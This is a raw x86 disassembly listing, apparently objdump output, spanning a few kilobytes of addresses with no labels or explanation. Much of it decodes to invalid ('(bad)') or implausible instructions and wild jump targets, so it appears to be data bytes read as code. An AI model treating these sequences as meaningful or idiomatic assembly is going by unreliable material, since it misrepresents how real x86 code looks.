  40f53e:	add    BYTE PTR [ebp+0x458bf800],0x85
  40f545:	xor    DWORD PTR [edi],ecx
  40f547:	pushf  
  40f548:	js     0x40f511
  40f54a:	add    al,dh
  40f54c:	mov    eax,DWORD PTR [ebp+0x4509f8f4]
  40f552:	inc    eax
  40f553:	xor    eax,0x8b209f89
  40f558:	call   FWORD PTR [ebx+ecx*4]
  40f55b:	cmp    al,0x1
  40f55e:	mov    DWORD PTR [eax],0x8b8545c3
  40f564:	call   FWORD PTR [edi+edi*8]
  40f567:	dec    ebp
  40f568:	inc    ebp
  40f569:	mov    eax,DWORD PTR [ebx-0xffe374]
  40f56f:	mov    eax,DWORD PTR [eax]
  40f571:	mov    eax,edi
  40f573:	nop
  40f574:	ret    
  40f575:	add    BYTE PTR [ebp-0x130077],al
  40f57b:	jne    0x40f502
  40f57d:	test   edi,edi
  40f57f:	jne    0x40f580
  40f581:	dec    DWORD PTR [ebx-0x38aa1fe8]
  40f587:	call   0xffccf24f
  40f58c:	sbb    al,0x45
  40f58e:	stos   BYTE PTR es:[edi],al
  40f58f:	mov    eax,DWORD PTR [eax]
  40f591:	mov    edx,DWORD PTR [eax+0x3]
  40f594:	inc    ebp
  40f595:	cmp    al,0x8b
  40f597:	push   cs
  40f598:	cwde   
  40f599:	inc    ebp
  40f59a:	add    BYTE PTR [ebp-0xe78b39],al
  40f5a0:	call   FWORD PTR [esp+eax*1]
  40f5a3:	test   eax,0x8bffff00
  40f5a8:	mov    DWORD PTR [esp+eiz*4],ebx
  40f5ab:	adc    BYTE PTR [ebp+0x1],0x8b
  40f5af:	add    al,ch
  40f5b1:	add    al,dh
  40f5b3:	mov    DWORD PTR [ebp-0x3d],0x7589458b
  40f5ba:	mov    ecx,DWORD PTR [ebx-0x76cfe314]
  40f5c0:	inc    ebp
  40f5c1:	add    DWORD PTR [ebx-0x7aceb000],ecx
  40f5c7:	cmp    bh,0x1
  40f5ca:	inc    DWORD PTR [eax]
  40f5cc:	inc    ebp
  40f5cd:	push   eax
  40f5ce:	xor    ebp,ecx
  40f5d0:	add    eax,DWORD PTR [edx]
  40f5d2:	mov    DWORD PTR [eax],eax
  40f5d4:	and    al,0x80
  40f5d6:	inc    DWORD PTR [ecx]
  40f5d8:	lea    eax,[eax]
  40f5da:	pushf  
  40f5db:	or     BYTE PTR [ebp-0xfe00bb],al
  40f5e1:	jmp    0x13ff86b
  40f5e6:	dec    DWORD PTR [esi]
  40f5e8:	mov    ecx,ecx
  40f5ea:	loopne 0x40f571
  40f5ec:	mov    DWORD PTR [edx],0x4d8b00c3
  40f5f2:	sbb    al,0x8b
  40f5f4:	out    dx,al
  40f5f5:	mov    eax,DWORD PTR [eax]
  40f5f7:	push   eax
  40f5f8:	push   eax
  40f5f9:	test   DWORD PTR [ebp-0x1],eax
  40f5fc:	mov    edi,edi
  40f5fe:	cwde   
  40f5ff:	inc    ebp
  40f600:	add    BYTE PTR [ebx],dh
  40f602:	mov    DWORD PTR [ebx],0x24ff8918
  40f608:	add    al,0xff
  40f60a:	add    BYTE PTR [ebx-0x5ae30f77],cl
  40f610:	(bad)  
  40f611:	(bad)  
  40f612:	(bad)  
  40f613:	(bad)  
  40f614:	push   DWORD PTR [ebx]
  40f616:	or     BYTE PTR [ebx],al
  40f618:	ror    BYTE PTR [ecx-0xbad7d0],0x83
  40f61f:	(bad)  
  40f620:	cld    
  40f621:	sbb    BYTE PTR [ebx+0x765050ff],al
  40f627:	inc    ebp
  40f628:	mov    esi,DWORD PTR [ebx]
  40f62a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f62b:	add    ecx,esi
  40f62d:	push   eax
  40f62e:	mov    BYTE PTR [ebp+0x4d],0x5
  40f632:	jmp    0x40f634
  40f634:	mov    eax,DWORD PTR [eax]
  40f636:	clc    
  40f637:	mov    ecx,DWORD PTR [esp+ebx*1]
  40f63a:	inc    DWORD PTR [eax+0x5501fc]
  40f640:	mov    BYTE PTR [ebp-0xe70075],al
  40f646:	cmp    eax,DWORD PTR [eax]
  40f648:	push   eax
  40f649:	add    cl,ch
  40f64b:	xor    BYTE PTR [esi+0x4d],cl
  40f64e:	add    edi,edi
  40f650:	mov    ecx,DWORD PTR [eax]
  40f652:	mov    al,ds:0x8b8b004d
  40f657:	mov    ebp,DWORD PTR [ebx]
  40f659:	hlt    
  40f65a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f65b:	add    dh,al
  40f65d:	add    DWORD PTR [ebp+0x45],edx
  40f660:	mov    ecx,DWORD PTR [ecx+0x18d68b28]
  40f666:	dec    ebp
  40f667:	inc    eax
  40f668:	mov    DWORD PTR [ecx-0xbadf1c],ecx
  40f66e:	add    BYTE PTR [ebx-0x38162400],cl
  40f674:	add    bl,al
  40f676:	add    BYTE PTR [ebp-0x2e003e],al
  40f67c:	mov    DWORD PTR [ebp-0x10],eax
  40f67f:	mov    DWORD PTR [ebp+0x28],esp
  40f682:	push   eax
  40f683:	dec    DWORD PTR [ecx+0x5518e88d]
  40f689:	dec    DWORD PTR [ecx+0x5545f050]
  40f68f:	xor    ecx,DWORD PTR [edi]
  40f691:	add    edx,DWORD PTR [edx]
  40f693:	push   eax
  40f694:	xchg   ebp,eax
  40f695:	inc    ebp
  40f696:	inc    DWORD PTR ds:0xe200ff
  40f69c:	jnp    0x809612a2
  40f6a2:	mov    eax,DWORD PTR [ecx]
  40f6a4:	pusha  
  40f6a5:	add    bh,bh
  40f6a7:	test   ecx,eax
  40f6a9:	dec    DWORD PTR [edi+edi*8]
  40f6ac:	ret    0x8d00
  40f6af:	add    bh,bh
  40f6b1:	mov    ch,0xd7
  40f6b3:	(bad)  
  40f6b4:	cli    
  40f6b5:	inc    DWORD PTR [ebp+0x2255f830]
  40f6bb:	test   DWORD PTR [ebp+0x74],ecx
  40f6be:	add    ecx,DWORD PTR [ebx+0x65a01889]
  40f6c4:	or     BYTE PTR [eax],al
  40f6c6:	cmp    DWORD PTR [eax+0x74],edi
  40f6c9:	add    BYTE PTR [ebx+0x114dfc23],cl
  40f6cf:	sub    eax,DWORD PTR [eax]
  40f6d1:	mov    ecx,DWORD PTR [ebp-0x77]
  40f6d4:	mov    eax,edi
  40f6d6:	add    DWORD PTR [ebx],eax
  40f6d8:	inc    ebp
  40f6d9:	dec    ebp
  40f6da:	mov    ecx,DWORD PTR [edx+0x45450118]
  40f6e0:	add    cl,BYTE PTR [ebx+0x875fc4d]
  40f6e6:	mov    ecx,DWORD PTR [ebp-0xc]
  40f6e9:	inc    eax
  40f6ea:	push   ebp
  40f6eb:	push   ecx
  40f6ec:	mov    esi,DWORD PTR [edx-0x14]
  40f6ef:	mov    edx,DWORD PTR [ecx+0xce003c]
  40f6f5:	adc    DWORD PTR [eax+eax*1],0xd68b0045
  40f6fc:	add    al,0x55
  40f6fe:	push   ebp
  40f6ff:	add    ecx,DWORD PTR [ecx-0x2d030777]
  40f705:	push   ecx
  40f706:	test   DWORD PTR [ebx],eax
  40f708:	dec    DWORD PTR [ecx+0x554518ff]
  40f70e:	mov    edi,eax
  40f710:	sbb    al,0xec
  40f712:	inc    DWORD PTR [eax]
  40f714:	mov    DWORD PTR [eax],0xff8318
  40f71a:	add    al,0x83
  40f71c:	add    al,bh
  40f71e:	mov    ebp,edx
  40f720:	push   eax
  40f721:	push   ebp
  40f722:	test   DWORD PTR [edi+edi*8-0x73],esi
  40f726:	dec    DWORD PTR [eax]
  40f728:	inc    ebp
  40f729:	push   ebp
  40f72a:	xor    ecx,DWORD PTR [ebx+0x5589f003]
  40f730:	and    al,0x8b
  40f732:	(bad)  
  40f733:	call   0x89ddaec5
  40f738:	test   DWORD PTR [eax-0x1],esp
  40f73b:	(bad)  
  40f73c:	inc    DWORD PTR [ecx+0xffff85]
  40f742:	dec    DWORD PTR [ecx-0x6a1f5f75]
  40f748:	(bad)  
  40f749:	inc    ebx
  40f74b:	dec    DWORD PTR [ebx-0x117ee316]
  40f751:	arpl   WORD PTR [eax],ax
  40f753:	int    0x50
  40f755:	xor    eax,DWORD PTR [ebp-0x7f]
  40f758:	mov    esi,DWORD PTR [eax]
  40f75a:	cwde   
  40f75b:	pushf  
  40f75c:	add    BYTE PTR [ebp-0x1],dh
  40f75f:	mov    edi,edi
  40f761:	mov    al,ds:0x4d45ce08
  40f766:	inc    DWORD PTR [ebx]
  40f768:	adc    al,0x83
  40f76a:	add    BYTE PTR [eax],0x1
  40f76d:	adc    BYTE PTR [eax],al
  40f76f:	push   ebp
  40f770:	inc    ebp
  40f771:	add    edi,edi
  40f773:	mov    edx,DWORD PTR [eax]
  40f775:	mov    ecx,DWORD PTR [ebp-0x60]
  40f778:	push   esi
  40f779:	adc    al,0x8
  40f77b:	mov    edx,DWORD PTR [ebp-0x8]
  40f77e:	mov    ecx,DWORD PTR [ebp-0x4]
  40f781:	add    DWORD PTR [ebp-0x18],0xffffff8d
  40f785:	inc    DWORD PTR [eax+esi*8]
  40f788:	inc    ebp
  40f789:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f78a:	mov    edx,DWORD PTR [ebp+0x1c]
  40f78d:	add    DWORD PTR [ebp-0x14],eax
  40f790:	mov    edx,DWORD PTR [ebp-0x70]
  40f793:	cmp    eax,DWORD PTR [eax]
  40f795:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f796:	mov    eax,DWORD PTR [eax]
  40f798:	sbb    al,0x73
  40f79a:	add    BYTE PTR [ebx],0x1
  40f79d:	hlt    
  40f79e:	add    BYTE PTR [eax+0x30],dl
  40f7a1:	mov    DWORD PTR [ecx],esi
  40f7a3:	hlt    
  40f7a4:	pop    ds
  40f7a5:	inc    ebp
  40f7a6:	xor    al,BYTE PTR [ebp+0x6c760f3a]
  40f7ac:	(bad)  
  40f7ad:	push   DWORD PTR [edi]
  40f7af:	mov    ecx,DWORD PTR [ebx+0x398503a4]
  40f7b5:	push   DWORD PTR [ebx-0x1]
  40f7b8:	mov    eax,DWORD PTR [ebp-0x740075]
  40f7be:	sub    eax,DWORD PTR [eax]
  40f7c0:	add    eax,DWORD PTR [eax]
  40f7c2:	mov    DWORD PTR [ecx+0x5f],eax
  40f7c5:	mov    DWORD PTR [ebx+0x20],ebx
  40f7c8:	ret    0xff
  40f7cb:	mov    ecx,DWORD PTR [ebx+0x1cc783dc]
  40f7d1:	ret    
  40f7d2:	mov    eax,DWORD PTR [ebp-0x6f0075]
  40f7d8:	add    BYTE PTR [ebp-0x7d],al
  40f7db:	mov    DWORD PTR [eax],eax
  40f7dd:	sub    BYTE PTR [edi+edi*8+0x18008d01],al
  40f7e4:	sar    bh,cl
  40f7e6:	test   BYTE PTR [eax+0x1],dl
  40f7e9:	inc    ebp
  40f7ea:	add    BYTE PTR [ebx],dh
  40f7ec:	test   BYTE PTR [ebx],0x84
  40f7ef:	push   eax
  40f7f0:	add    BYTE PTR [ebp+0x0],al
  40f7f3:	add    eax,0x86
  40f7f8:	add    BYTE PTR [ebx-0x7f7be340],cl
  40f7fe:	add    BYTE PTR [ecx],al
  40f800:	add    BYTE PTR [eax],al
  40f802:	mov    esi,0x550030
  40f807:	mov    ecx,DWORD PTR [edi]
  40f809:	sbb    al,0xda
  40f80b:	jne    0x40f80d
  40f80d:	mov    edi,DWORD PTR [ecx]
  40f80f:	xor    BYTE PTR [eax+eax*1],0x84
  40f813:	add    eax,DWORD PTR [eax]
  40f815:	cld    
  40f816:	add    BYTE PTR [ebp-0x4f],dh
  40f819:	mov    eax,DWORD PTR [ecx]
  40f81b:	cld    
  40f81c:	add    BYTE PTR [ecx-0x1bff009b],cl
  40f822:	retf   0xe45
  40f825:	add    eax,edx
  40f827:	sbb    al,0xb7
  40f829:	dec    ebp
  40f82a:	or     al,0x89
  40f82c:	dec    ebp
  40f82d:	sbb    al,0xf
  40f82f:	inc    ebp
  40f830:	dec    eax
  40f831:	mov    eax,DWORD PTR [ebx]
  40f833:	sbb    al,0xf
  40f835:	nop
  40f836:	scas   al,BYTE PTR es:[edi]
  40f837:	add    DWORD PTR [eax],eax
  40f839:	add    BYTE PTR [ebp-0x7674ebbb],cl
  40f83f:	mov    eax,gs
  40f841:	add    bh,bh
  40f843:	mov    edi,edi
  40f845:	cmp    DWORD PTR [edi+0x72],edx
  40f848:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  40f84e:	gs cmp al,0x0
  40f851:	je     0x40f829
  40f853:	push   eax
  40f854:	sar    BYTE PTR [eax],1
  40f856:	mov    bh,0x3e
  40f858:	push   cs
  40f859:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  40f85f:	add    DWORD PTR [ecx+0x12],ebp
  40f862:	dec    edx
  40f863:	(bad)  
  40f864:	mov    eax,edx
  40f866:	in     al,dx
  40f867:	adc    DWORD PTR [ecx],esi
  40f869:	pop    esi
  40f86a:	inc    ecx
  40f86b:	leave  
  40f86c:	or     DWORD PTR [eax],ebx
  40f86e:	gs push ebp
  40f870:	add    ah,ch
  40f872:	into   
  40f873:	in     al,dx
  40f874:	enter  0xb756,0xf0
  40f878:	push   cs
  40f879:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  40f883:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  40f889:	jnp    0x74417d91
  40f88f:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  40f895:	add    BYTE PTR [edi],cl
  40f897:	mov    edi,DWORD PTR [ecx-0x78]
  40f89a:	ltr    WORD PTR [ecx-0x7b]
  40f89e:	dec    DWORD PTR [edi]
  40f8a0:	clc    
  40f8a1:	out    0x45,eax
  40f8a3:	add    BYTE PTR [eax],cl
  40f8a5:	cmp    ebx,0xffffff8c
  40f8a8:	jge    0x40f8aa
  40f8aa:	jb     0x40f8bc
  40f8ac:	je     0x4ff92c
  40f8b2:	pop    edx
  40f8b3:	push   esi
  40f8b4:	mov    ecx,DWORD PTR [edi]
  40f8b6:	in     al,dx
  40f8b7:	rol    DWORD PTR [ebp+0x0],1
  40f8ba:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  40f8c1:	cmp    DWORD PTR [ecx],0xfffffff0
  40f8c4:	hlt    
  40f8c5:	mov    esp,DWORD PTR [eax+0xf034d2b]
  40f8cb:	(bad)  
  40f8cd:	push   eax
  40f8ce:	jns    0xb840dd4c
  40f8d4:	lock push cs
  40f8d6:	ror    edx,0x3
  40f8d9:	test   BYTE PTR [ecx+0x5500e800],cl
  40f8df:	dec    eax
  40f8e0:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  40f8e4:	(bad)  
  40f8e5:	mov    esi,0x7f33ff5f
  40f8ea:	inc    eax
  40f8eb:	test   DWORD PTR [edx],eax
  40f8ed:	je     0x40f8af
  40f8ef:	mov    ecx,ecx
  40f8f1:	adc    DWORD PTR [ebp-0xc],0xffffffec
  40f8f5:	and    eax,DWORD PTR [eax+0xf0103]
  40f8fb:	jp     0x40f8e9
  40f8fd:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  40f901:	add    edx,DWORD PTR [edi+0x74]
  40f904:	sbb    BYTE PTR [ebp+0x4d001484],cl
  40f90a:	add    BYTE PTR [ebp-0x74c48bbb],al
  40f910:	je     0x40f895
  40f912:	cmp    eax,edi
  40f914:	js     0x40f939
  40f916:	add    eax,0xeb0fc003
  40f91b:	jns    0x40f8a8
  40f91d:	vmread DWORD PTR [ecx+0x45],ebx
  40f921:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  40f927:	adc    al,0x8b
  40f929:	jge    0x40f93f
  40f92b:	mov    edi,DWORD PTR [eax-0x4]
  40f92e:	add    edi,DWORD PTR [edi]
  40f930:	or     bh,bh
  40f932:	push   ebp
  40f933:	push   es
  40f934:	mov    DWORD PTR [ebp-0x4],ebx
  40f937:	add    edi,esi
  40f939:	pop    es
  40f93a:	add    esi,DWORD PTR [edi-0x48ccf183]
  40f940:	mov    DWORD PTR [esp+esi*8],ecx
  40f943:	inc    ebp
  40f944:	pop    ebp
  40f945:	xor    DWORD PTR [esi-0x4],0x3b
  40f949:	add    edx,DWORD PTR [ecx+edi*1]
  40f94c:	push   es
  40f94d:	clc    
  40f94e:	mov    bh,0xdb
  40f950:	jp     0x40f909
  40f952:	add    cl,BYTE PTR [esi]
  40f954:	div    DWORD PTR [edi+0x4d8b0c1c]
  40f95a:	test   edi,edi
  40f95c:	je     0x40f952
  40f95e:	mov    eax,ecx
  40f960:	or     BYTE PTR [ebx],al
  40f962:	dec    BYTE PTR [ecx+0x7d3bec7d]
  40f968:	jbe    0x40f9dc
  40f96a:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  40f970:	add    ecx,DWORD PTR [esi]
  40f972:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  40f978:	add    eax,DWORD PTR [ebx-0x287af783]
  40f97e:	je     0x40f9cd
  40f980:	mov    DWORD PTR [ecx],edi
  40f982:	mov    esi,eax
  40f984:	hlt    
  40f985:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  40f98c:	jb     0x40f94e
  40f98e:	jmp    0x40f97b
  40f990:	xor    esi,DWORD PTR [ebx]
  40f992:	pop    edi
  40f993:	pop    esi
  40f994:	pop    ebx
  40f995:	ret    
  40f996:	ret    0x8b
  40f999:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  40f99f:	xor    DWORD PTR ds:0x89339c0c,0x56
  40f9a6:	cld    
  40f9a7:	cmp    DWORD PTR [ebp+0xf],eax
  40f9aa:	xor    al,BYTE PTR [ebp-0x7474ff64]
  40f9b0:	cld    
  40f9b1:	or     al,0x4d
  40f9b3:	ret    
  40f9b4:	mov    edi,DWORD PTR [esi-0x4]
  40f9b7:	pop    eax
  40f9b8:	dec    ebp
  40f9b9:	jne    0x40f946
  40f9bb:	xor    edi,esp
  40f9bd:	inc    eax
  40f9be:	dec    ebp
  40f9bf:	jbe    0x40fa14
  40f9c1:	inc    eax
  40f9c2:	pop    ebp
  40f9c3:	add    edx,DWORD PTR [esi+0x8]
  40f9c6:	push   esi
  40f9c7:	dec    eax
  40f9c8:	push   ecx
  40f9c9:	mov    eax,edi
  40f9cb:	and    al,0xf0
  40f9cd:	jo     0x40f9ba
  40f9cf:	mov    eax,DWORD PTR [ebx]
  40f9d1:	sbb    BYTE PTR [ebp+0x4d],cl
  40f9d4:	mov    eax,DWORD PTR [ebx]
  40f9d6:	nop
  40f9d7:	or     BYTE PTR [eax],al
  40f9d9:	jne    0x40fa32
  40f9db:	cmp    ebx,DWORD PTR [ebp+0x33893277]
  40f9e1:	cld    
  40f9e2:	xor    edi,edi
  40f9e4:	add    edi,DWORD PTR [ebp+0x3]
  40f9e7:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  40f9ed:	js     0x40f973
  40f9ef:	jae    0x40f9f3
  40f9f1:	(bad)  
  40f9f3:	xor    al,0x5d
  40f9f5:	jmp    0x40f982
  40f9f7:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  40f9fe:	fdecstp 
  40fa00:	test   BYTE PTR [edi],ah
  40fa02:	add    bh,BYTE PTR [ebp+0x0]
  40fa05:	add    ebx,DWORD PTR [ebp-0x77]
  40fa08:	mov    edi,eax
  40fa0a:	cmp    al,0x0
  40fa0d:	adc    dh,BYTE PTR [ebx]
  40fa0f:	jge    0x40fa14
  40fa11:	mov    edi,DWORD PTR [ebx]
  40fa13:	jl     0x40fa24
  40fa15:	clc    
  40fa16:	dec    edi
  40fa17:	jge    0x40fa19
  40fa19:	mov    eax,DWORD PTR [ebx]
  40fa1b:	jb     0x40fa25
  40fa1d:	mov    ecx,DWORD PTR [ebp-0x8]
  40fa20:	mov    edi,edi
  40fa22:	xor    edx,DWORD PTR [eax]
  40fa24:	add    edi,DWORD PTR [ebx]
  40fa26:	mov    DWORD PTR [ebp-0x10],edi
  40fa29:	inc    edi
  40fa2a:	pop    ebp
  40fa2b:	jge    0x40fa68
  40fa2d:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  40fa31:	mov    edx,0xc05d87f0
  40fa36:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  40fa3a:	fimul  WORD PTR [eax]
  40fa3c:	fist   WORD PTR [ebp+0x1c]
  40fa3f:	in     al,dx
  40fa40:	jne    0x40fa2e
  40fa42:	mov    edi,DWORD PTR [edx-0x7a27a10]
  40fa48:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  40fa4c:	fdivp  st(0),st
  40fa4e:	fild   WORD PTR [ebp+0x4510f85c]
  40fa54:	test   BYTE PTR [ebx+0x4d00fc02],cl
  40fa5a:	inc    ebp
  40fa5b:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  40fa61:	mov    ebp,DWORD PTR [ebx-0x4]
  40fa64:	adc    al,0x8b
  40fa66:	rcl    DWORD PTR [eax],0x48
  40fa69:	mov    esi,0x7080803
  40fa6e:	fiadd  WORD PTR [ebp+0x4d]
  40fa71:	(bad)  
  40fa72:	mov    edx,DWORD PTR [edx-0x4]
  40fa75:	mov    edx,DWORD PTR [ebp-0x4]
  40fa78:	xor    ebx,DWORD PTR [ebx+0x330103]
  40fa7e:	mov    DWORD PTR [edi+0x872dc],edi
  40fa84:	xlat   BYTE PTR ds:[ebx]
  40fa85:	into   
  40fa86:	ffreep st(6)
  40fa88:	retf   0x6c7
  40fa8b:	iret   
  40fa8c:	dec    ebp
  40fa8d:	inc    ebp
  40fa8e:	mov    DWORD PTR [ebx],edi
  40fa90:	fmul   QWORD PTR [edi]
  40fa92:	dec    ebp
  40fa93:	jnp    0x40fac8
  40fa95:	add    BYTE PTR [ebx],al
  40fa97:	mov    ecx,DWORD PTR [esp+edi*8]
  40fa9a:	inc    ebp
  40fa9b:	dec    ebp
  40fa9c:	lea    esi,[ebx]
  40fa9e:	add    DWORD PTR [ebx],eax
  40faa0:	jb     0x40fadd
  40faa2:	add    BYTE PTR [edi],cl
  40faa4:	inc    ebp
  40faa5:	imul   eax,edi,0x858bd800
  40faab:	cld    
  40faac:	clc    
  40faad:	mov    DWORD PTR [ebp+0x0],eax
  40fab0:	inc    DWORD PTR [eax]
  40fab2:	or     al,0xde
  40fab4:	sbb    bh,0x1
  40fab7:	retf   
  40fab8:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  40fabf:	dec    ebp
  40fac0:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  40fac6:	enter  0x12de,0xdf
  40faca:	inc    ebp
  40facb:	pop    ebp
  40facc:	dec    DWORD PTR [ebx-0x257f0ff4]
  40fad2:	add    DWORD PTR [edx],edx
  40fad4:	add    BYTE PTR [ebp+0x50],dl
  40fad7:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  40fadd:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  40fae3:	or     ah,al
  40fae5:	pop    ss
  40fae6:	cdq    
  40fae7:	push   ebp
  40fae8:	clc    
  40fae9:	mov    eax,DWORD PTR [ebp-0x4]
  40faec:	xor    edx,edx
  40faee:	add    esi,DWORD PTR [ebx]
  40faf0:	cmp    eax,DWORD PTR [ebx]
  40faf2:	hlt    
  40faf3:	cmp    DWORD PTR [ebx],esp
  40faf5:	or     al,BYTE PTR [ebp+0xf]
  40faf8:	mov    eax,DWORD PTR [edx]
  40fafa:	loopne 0x40fafc
  40fafc:	(bad)  
  40fafd:	mov    ecx,esi
  40faff:	cld    
  40fb00:	pushf  
  40fb01:	pop    ebp
  40fb02:	popf   
  40fb03:	mov    esi,DWORD PTR [edx]
  40fb05:	lock mov eax,eax
  40fb08:	adc    BYTE PTR [ebx],al
  40fb0a:	or     BYTE PTR [ebx+0x4d001001],0xcf
  40fb11:	xor    ebp,DWORD PTR [edi+0x50e45189]
  40fb17:	dec    ebp
  40fb18:	mov    ecx,DWORD PTR [ebx-0x31390304]
  40fb1e:	(bad)  
  40fb1f:	iret   
  40fb20:	inc    ebp
  40fb21:	(bad)  
  40fb22:	jne    0x40fb71
  40fb24:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  40fb2a:	(bad)  
  40fb2b:	cmp    ebx,eax
  40fb2d:	je     0x40fab5
  40fb2f:	add    edi,edi
  40fb31:	or     bh,bh
  40fb33:	dec    ebp
  40fb34:	inc    ebp
  40fb35:	mov    esi,DWORD PTR [ebx]
  40fb37:	cld    
  40fb38:	add    ecx,esi
  40fb3a:	cmp    ecx,DWORD PTR [eax-0xc]
  40fb3d:	mov    edx,DWORD PTR [edi]
  40fb3f:	or     BYTE PTR [ebp-0x7c],al
  40fb42:	mov    ebx,DWORD PTR [ebp-0x7639cd18]
  40fb48:	test   BYTE PTR [ebx*4-0x76c1cdbb],cl
  40fb4f:	pushf  
  40fb50:	call   0x51eae0
  40fb55:	jne    0x40fb1e
  40fb57:	mov    ebp,esp
  40fb59:	fcomp  DWORD PTR [ebx]
  40fb5b:	add    BYTE PTR [ecx],al
  40fb5d:	inc    DWORD PTR [ebp-0x75]
  40fb60:	(bad)  
  40fb61:	cld    
  40fb62:	add    al,0xce
  40fb64:	mov    ecx,edi
  40fb66:	cld    
  40fb67:	inc    ebp
  40fb68:	fidivr WORD PTR [ebx]
  40fb6a:	fbstp  TBYTE PTR [ebp-0x3e]
  40fb6d:	mov    eax,DWORD PTR [eax]
  40fb6f:	adc    BYTE PTR [ebx-0x3974038b],cl
  40fb75:	fadd   st,st(7)
  40fb77:	add    BYTE PTR [ebp-0x1],al
  40fb7a:	mov    ecx,DWORD PTR [esp+edi*8]
  40fb7d:	inc    ebp
  40fb7e:	mov    bh,0xc7
  40fb81:	loopne 0x40fbc8
  40fb83:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  40fb89:	sbb    dh,BYTE PTR [ebx]
  40fb8b:	pushf  
  40fb8c:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  40fb92:	mov    eax,edi
  40fb94:	cwde   
  40fb95:	inc    ebp
  40fb96:	inc    ebp
  40fb97:	jne    0x40fb24
  40fb99:	mov    esp,esp
  40fb9b:	clc    
  40fb9c:	add    al,0x4d
  40fb9e:	mov    DWORD PTR [ebx],esi
  40fba0:	or     al,0x33
  40fba2:	inc    ebp
  40fba3:	lea    ecx,[ebx-0x398d13fd]
  40fba9:	add    bh,al
  40fbab:	inc    ebp
  40fbac:	ror    DWORD PTR [ebx+0x45d829],0x8b
  40fbb3:	add    ebp,esp
  40fbb5:	shufps xmm1,xmm3,0xc7
  40fbb9:	(bad)  
  40fbba:	jmp    0x748636e3
  40fbbf:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  40fbc5:	hlt    
  40fbc6:	mov    ecx,DWORD PTR [edi]
  40fbc8:	fadd   DWORD PTR [ebp+0x0]
  40fbcb:	xor    ecx,DWORD PTR [edi]
  40fbcd:	add    ecx,ecx
  40fbcf:	cmp    edi,edi
  40fbd1:	pmuludq mm7,QWORD PTR [edx+0x50]
  40fbd5:	(bad)  
  40fbd6:	jmp    0x40fb63
  40fbd8:	mov    edi,esp
  40fbda:	or     al,0xc6
  40fbdc:	inc    ebp
  40fbdd:	(bad)  
  40fbde:	mov    eax,DWORD PTR [ebp+0x10]
  40fbe1:	jne    0x40fb6c
  40fbe3:	mov    eax,DWORD PTR [ecx]
  40fbe5:	clc    
  40fbe6:	add    BYTE PTR [ebp-0x40],cl
  40fbe9:	xor    edx,DWORD PTR [eax-0x73]
  40fbec:	jne    0x40fbef
  40fbee:	push   DWORD PTR [edx+0x8]
  40fbf1:	add    BYTE PTR [ebp+0x45],al
  40fbf4:	mov    ebp,ecx
  40fbf6:	cld    
  40fbf7:	add    BYTE PTR [ebp+0x0],cl
  40fbfa:	xor    eax,DWORD PTR [ebp+0x3]
  40fbfd:	lea    edi,[ebx]
  40fbff:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  40fc05:	sub    eax,0x5d330e4d
  40fc0a:	lea    esi,[ebx]
  40fc0c:	add    DWORD PTR [ebx],eax
  40fc0e:	jb     0x40fbf9
  40fc10:	add    BYTE PTR [eax],al
  40fc12:	inc    ebp
  40fc13:	add    bl,ch
  40fc15:	inc    ebp
  40fc16:	mov    esi,DWORD PTR [ebx]
  40fc18:	or     al,0x3
  40fc1a:	(bad)  
  40fc1b:	mov    edi,eax
  40fc1d:	in     al,dx
  40fc1e:	scas   eax,DWORD PTR es:[edi]
  40fc1f:	inc    ebp
  40fc20:	mov    esi,DWORD PTR [ebx]
  40fc22:	in     al,0x3
  40fc24:	add    al,0x89
  40fc26:	mov    ecx,DWORD PTR [eax+edi*8]
  40fc29:	dec    ebp
  40fc2a:	(bad)  
  40fc2b:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3163]
  40fc32:	mov    ecx,eax
  40fc34:	cld    
  40fc35:	push   es
  40fc36:	dec    ebp
  40fc37:	add    al,0x33
  40fc39:	mov    DWORD PTR [ebx],eax
  40fc3b:	in     al,dx
  40fc3c:	cmp    DWORD PTR [ebp-0x67],eax
  40fc3f:	mov    eax,DWORD PTR [ebp-0xba0068]
  40fc45:	mov    edx,DWORD PTR [ebp-0x4]
  40fc48:	mov    ecx,DWORD PTR [ebp-0x18]
  40fc4b:	xor    ecx,DWORD PTR [ebp+0x3]
  40fc4e:	cmp    DWORD PTR [ebx],0x8b32749c
  40fc54:	xor    edi,esp
  40fc56:	jmp    0xff74f9a8
  40fc5b:	add    ecx,DWORD PTR [ebp-0x3f]
  40fc5e:	xor    ebx,DWORD PTR [edi]
  40fc60:	add    eax,ecx
  40fc62:	cmp    ebx,DWORD PTR [eax]
  40fc64:	mov    ecx,DWORD PTR [ebp-0x4]
  40fc67:	mov    ecx,DWORD PTR [eax]
  40fc69:	adc    BYTE PTR [ebp-0x80],al
  40fc6c:	jmp    0x40fc6f
  40fc6e:	mov    eax,DWORD PTR [eax]
